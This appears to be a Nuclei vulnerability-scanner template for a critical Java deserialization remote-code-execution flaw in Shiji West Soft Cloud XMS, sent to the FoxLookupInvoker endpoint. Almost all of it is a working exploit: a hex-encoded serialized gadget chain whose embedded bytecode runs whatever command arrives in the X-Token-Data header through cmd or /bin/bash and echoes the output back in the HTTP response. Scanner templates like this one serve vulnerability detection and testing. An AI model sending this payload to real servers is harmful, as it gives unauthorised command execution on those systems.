id: shiji-west-soft-cloud-xms-foxlookupinvoker-rce

info:
  name: 西软云XMS FoxLookupInvoker 反序列化
  author: SleepingBag945
  severity: critical


http:
  - raw:
    - |
      POST /fox-invoker/FoxLookupInvoker/?return-exception=true HTTP/1.1
      Host: {{Hostname}}
      X-Token-Data: echo {{randstr}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
      Connection: close
      
      {{hex_decode("aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72cf8e0182fe4ef17e0200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b78700000000000000000757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e0020000787000000cf9cafebabe0000003100b901002e6f72672f6170616368652f6c6f6767696e672f78616c616e2f74656d706c617465732f456c656d456c656d656e740700010100106a6176612f6c616e672f4f626a6563740700030100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650c000500060a0004000901000171010033284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f4279746541727261794f757470757453747265616d3b01000765786563436d640c000d000c0a0002000e0100106765744d6574686f644279436c617373010051284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100136a6176612f6c616e672f457863657074696f6e0700120100186a6176612f6c616e672f7265666c6563742f4d6574686f6407001401000d537461636b4d61705461626c6501000f6a6176612f6c616e672f436c6173730700170100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0c0019001a0a0018001b01000d73657441636365737369626c65010004285a29560c001d001e0a0015001f01000d6765745375706572636c61737301001328294c6a6176612f6c616e672f436c6173733b0c002100220a001800230100126765744d6574686f64416e64496e766f6b6501005d284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574436c6173730c002700220a000400280c001000110a0002002a010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c002c002d0a0015002e0100083c636c696e69743e0100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0700310100106a6176612f6c616e672f537472696e6707003301001d6a6176612f696f2f4279746541727261794f757470757453747265616d0700350100256a617661782e736572766c65742e687474702e48747470536572766c6574526571756573740800370100216a617661782f73656375726974792f6a6163632f506f6c696379436f6e7465787407003901000a676574436f6e74657874010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f4f626a6563743b0c003b003c0a003a003d01000967657448656164657208003f01000a434d445f4845414445520100124c6a6176612f6c616e672f537472696e673b0c0041004209000200430c002500260a00020045010008746f537472696e6701001428294c6a6176612f6c616e672f537472696e673b0c004700480a000400490100076973456d70747901000328295a0c004b004c0a0034004d0c000b000c0a0002004f01002f696f2e756e646572746f772e736572766c65742e737065632e48747470536572766c657452657175657374496d706c080051010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0c005300540a0018005501000b67657445786368616e676508005701000f6765744f757470757453747265616d0800590100146a6176612f696f2f4f757470757453747265616d07005b01000b746f42797465417272617901000428295b420c005d005e0a0036005f0100057772697465010005285b4229560c006100620a005c0063010005636c6f73650c006500060a005c006601000b676574526573706f6e73650800680100077265717565737408006a0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0c006c006d0a0018006e0100176a6176612f6c616e672f7265666c6563742f4669656c640700700a0071001f010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c007300740a007100750100096765745772697465720800770800610a00360049010005666c75736808007b0800650100135b4c6a6176612f6c616e672f537472696e673b07007e0100136a6176612f696f2f496e70757453747265616d0700800100025b420700820100076f732e6e616d650800840100106a6176612f6c616e672f53797374656d07008601000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c008800890a0087008a01000b746f4c6f776572436173650c008c00480a0034008d01000377696e08008f010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c009100920a00340093010003636d640800950100022f630800970100092f62696e2f626173680800990100022d6308009b0100116a6176612f6c616e672f52756e74696d6507009d01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c009f00a00a009e00a101000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c00a300a40a009e00a50100116a6176612f6c616e672f50726f636573730700a701000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0c00a900aa0a00a800ab0a00360009010007285b42494929560c006100ae0a003600af01000472656164010005285b4229490c00b100b20a008100b301000a536f7572636546696c6501000e4a626f73734563686f2e6a61766101000c582d546f6b656e2d446174610800b70021000200040000000100090041004200000006000100050006000100070000001d00010001000000052ab7000ab1000000010008000000060001000000070009000b000c000100070000001100010001000000052ab8000fb000000000000900100011000100070000007a0003000500000023014e2ac6001e2a2b2cb6001c4e2d04b60020014ba7ffee3a042ab600244ba7ffe42db000010006001400170013000200080000002a000a000000320002003300060035000d0036001200370014003a0017003800190039001e003a0021003c00160000000d0003fc000207001554070013090009002500260001000700000061000300050000001f2ab600292b2cb8002b3a041904c6000b19042a2db6002fb0a700053a0401b0000100000017001b0013000200080000001a000600000041000b00420010004300180045001b0044001d0046001600000008000318420700130100080030000600010007000001b600070006000000ff12b8b300441238b8003e4b2a124004bd0018590312345304bd00045903b2004453b80046b6004a4c2bc600d12bb6004e9a00ca2bb800504d1252b80056572a125803bd001803bd0004b800464e2d125a03bd001803bd0004b80046c0005c3a0419042cb60060b600641904b60067a7008c4e2a126903bd001803bd0004b800463a041904c700292ab60029126bb6006f3a05190504b6007219052ab60076126903bd001803bd0004b800463a041904127803bd001803bd0004b800463a051905127904bd0018590312345304bd000459032cb6007a53b80046571905127c03bd001803bd0004b80046571905127d03bd001803bd0004b8004657a700044bb100020038006e00710032000500fa00fd0013000200080000005e00170005000d000b000e002800100033001100380015003e0016004d00170060001800690019006e00260071001a0072001b0082001c0087001d0092001e0098001f00ad002200be002300da002400ea002500fa002900fd002800fe002b0016000000310005ff007100030700040700340700360001070032fd003b070032070004f8004cff000200000001070013fc00000700040009000d000c00010007000000e2000400070000008c2a01a5000a2ab6004e990006a70076014c1285b8008bb6008e1290b6009499001906bd00345903129653590412985359052a534ca7001606bd00345903129a535904129c5359052a534cb800a22bb600a6b600ac4dbb003659b700ad4e033604110400bc083a05a7000c2d1905031504b600b02c1905b600b459360402a0ffed2db0a700083a06a7000301b000010000008200850013000100160000003c00090c02fc002705ff0012000207003407007f0000ff001f000607003407007f07008107003601070083000008ff000e00010700340000420700130400007571007e0010000000fbcafebabe0000003400110100246f72672f6170616368652f746f6d6361742f636f6d6d6f6e732f696f2f48657844756d700700010100106a6176612f6c616e672f4f626a65637407000301000a536f7572636546696c6501000c48657844756d702e6a61766101001073657269616c56657273696f6e5549440100014a0571e669ee3c6d471801000d436f6e7374616e7456616c75650100063c696e69743e0100032829560c000c000d0a0004000e010004436f646500210002000400000001001a000700080001000b00000002000900010001000c000d000100100000001100010001000000052ab7000fb100000000000100050000000200067074000161707701007871007e000d78")}}

    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'status_code==200'
          - contains(body,"{{randstr}}")